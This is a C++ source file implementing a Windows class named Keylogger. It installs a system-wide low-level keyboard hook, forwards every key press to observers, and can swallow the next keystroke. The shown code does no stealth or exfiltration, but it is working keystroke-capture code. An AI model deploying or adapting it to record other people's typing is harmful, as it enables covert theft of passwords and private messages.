#include "Keylogger.hpp"
#include <log/Log.hpp>
#include <iostream>

namespace Keyboard
{
	__declspec(dllexport) LRESULT CALLBACK KeyloggingProc(int nCode,  WPARAM wParam,  LPARAM lParam)
    {
        LRESULT next = CallNextHookEx (Keylogger::instance().getHook(), nCode, wParam, lParam );
		if(!Keylogger::instance().isRunning())
        {
            return next;
        }

		if( (nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)) )
		{
			KeyInformation ki;
			ki.hooked = (*((KBDLLHOOKSTRUCT*)lParam));
			Keylogger::instance().notify(ki);
		}

		if(Keylogger::instance().isNextKeyBlocked())
		{
			Keylogger::instance().unblockNextKey();
			return 1;
		}
        return next;
    }

	Keylogger::Keylogger() : 
		Thread((LPTHREAD_START_ROUTINE)MsgLoop),
		isActivated(false),
		hook(0),
		blockNextKeyFlag(false)
	{
	}
	
    Keylogger::~Keylogger()
	{
		try
		{
			stop();
		}
		catch(...)
		{
		}
	}
	
	bool Keylogger::isNextKeyBlocked()
	{
		return blockNextKeyFlag;
	}

	void Keylogger::blockNextKey()
	{
		blockNextKeyFlag = true;
	}

	void Keylogger::unblockNextKey()
	{
		blockNextKeyFlag = false;
	}

	HHOOK Keylogger::getHook()
	{
		return hook;
	}
            
    void Keylogger::start()
    {
        TRACE_FUNCTION
        // on ne démarre le keylogger uniquement s'il n'est pas déjà actif
        Thread::start();
        LOG << "Keylogging enabled";
    }
            
    void Keylogger::stop()
    {
        TRACE_FUNCTION
        if(isRunning())
        {
            Thread::stop();

            if(!UnhookWindowsHookEx(hook))
		    {
			    LOG << "UnhookWindowsHookEx failed : " + Common::toString(GetLastError());
		    }
            LOG << "Keylogging disabled";
        }
    }
    
    DWORD WINAPI Keylogger::MsgLoop(LPVOID lpParameter)
    {
        Keylogger::instance().hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyloggingProc, GetModuleHandle(0), 0);
		if(Keylogger::instance().hook == NULL)
		{
			LOG << "SetWindowsHookEx failed : " + Common::toString(GetLastError());
        }

        MSG message;
        while (GetMessage(&message,NULL,0,0))
        {
            TranslateMessage(&message);
            DispatchMessage(&message);
        }
        return EXIT_SUCCESS;
    }

} // Keyboard
